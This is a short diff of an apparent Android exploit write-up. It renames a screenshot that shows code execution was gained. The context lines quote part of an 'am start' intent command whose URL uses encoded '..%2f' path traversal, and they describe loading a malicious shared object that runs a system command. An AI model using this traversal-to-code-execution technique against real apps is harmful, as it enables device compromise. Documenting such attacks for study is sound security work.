@@ -54,4 +54,4 @@ am start -a android.intent.action.VIEW -d "http://192.168.188.200:5000/..%2f..%2
 ![malicous so loaded](images/malicious%20app%20loaded.png)
 
 9. And check in app path and the system command successfully executed and created file based on our code for the shared object file.
-![gained RCE](images/success%20write%20so.png)
+![gained RCE](images/success%20rce.png)
